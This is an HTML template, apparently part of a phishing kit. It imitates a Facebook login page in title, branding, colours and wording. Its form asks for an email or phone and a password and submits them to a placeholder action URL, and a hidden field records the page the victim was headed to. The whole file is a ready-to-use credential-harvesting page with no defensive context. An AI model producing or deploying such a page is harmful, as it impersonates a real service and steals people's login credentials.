<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Facebook</title>
<style>
  body { font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
  .card { background: #fff; width: 396px; padding: 32px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,.14); text-align: center; }
  h1 { color: #1877f2; font-size: 34px; font-weight: 700; margin: 8px 0 4px; }
  .sub { color: #606770; font-size: 14px; margin-bottom: 20px; }
  form { text-align: left; }
  input { width: 100%; box-sizing: border-box; padding: 12px; margin-bottom: 10px; border: 1px solid #ccd0d5; border-radius: 6px; font-size: 16px; }
  button { width: 100%; padding: 12px; border: 0; border-radius: 6px; background: #1877f2; color: #fff; font-size: 17px; font-weight: 600; cursor: pointer; }
  button:hover { background: #166fe5; }
  .note { margin-top: 16px; font-size: 12px; color: #90949c; }
</style>
</head>
<body>
<div class="card">
  <h1>facebook</h1>
  <p class="sub">Log in to Facebook</p>
  <form method="post" action="{{.Action}}">
    <input type="hidden" name="orig" value="{{.Orig}}">
    <label>Email or phone</label>
    <input type="text" name="username" required autofocus>
    <label>Password</label>
    <input type="password" name="password" required>
    <button type="submit">Log In</button>
  </form>
  <p class="note">You must be signed in to continue.</p>
</div>
</body>
</html>
